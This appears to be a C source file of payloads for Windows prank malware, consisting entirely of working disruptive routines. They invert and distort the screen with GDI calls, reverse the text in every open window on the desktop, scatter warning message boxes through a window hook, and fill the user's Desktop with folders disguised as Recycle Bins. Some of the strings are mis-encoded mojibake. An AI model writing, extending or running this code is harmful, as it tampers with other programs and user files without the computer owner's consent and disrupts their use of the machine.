#include"Playloads.h"

void interval()
{
	GetWindowRect(hwnd, &rekt);
	BitBlt(hdc, 0, 0, rekt.right * 1.75 - rekt.left * 1.75, rekt.bottom * 1.75 - rekt.top * 1.75, hdc, 0, 0, NOTSRCCOPY);
}

void tunnel_screen()
{
	GetWindowRect(hwnd, &rekt);
	StretchBlt(hdc, 50, 50, rekt.right * 1.75 - 100, rekt.bottom * 1.75 - 100, hdc, 0, 0, rekt.right * 1.75, rekt.bottom * 1.75, SRCCOPY);

}

BOOL ReverseTCHAR(TCHAR* lpSrc)
{
	int size = lstrlenW(lpSrc);

	if (size == 0)
		return FALSE;

	TCHAR wchar = 0;
	for (int i = 0; i < (size / 2); i++)
	{
		wchar = lpSrc[i];
		lpSrc[i] = lpSrc[size - i - 1];
		lpSrc[size - i - 1] = wchar;
	}

	return TRUE;
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	TCHAR str[8192] = { 0 };

	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
		ReverseTCHAR(str);
		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
	}

	return TRUE;
}

DWORD WINAPI messageBoxThread(LPVOID parameter)
{
	hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxW(NULL, L"¼¦Êº", L"ÀóÖ¦", MB_OK | MB_ICONWARNING);
	UnhookWindowsHookEx(hook);

	return 0;
}

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (cx - pcs->cx);
			int y = random() % (cy - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

void Interval_Text()
{
	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);

}

void RecycleBin(int k, int m)
{
	LPWSTR lpPath = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, 4096);
	LPWSTR lpNewPath = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, 4096);
	GetEnvironmentVariableW(L"userprofile", lpPath, 2048);
	lstrcatW(lpPath, L"\\Desktop");

	for (int i = 0; i < k; i++) {
		swprintf(lpNewPath, L"%s\\»ØÊÕÕ¾%d.{645FF040-5081-101B-9F08-00AA002F954E}", lpPath, i + 1);
		CreateDirectoryW(lpNewPath, NULL);
		//if (i % 8 == 7) SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_FLUSH, NULL, NULL);
		Sleep(m);
	}
}
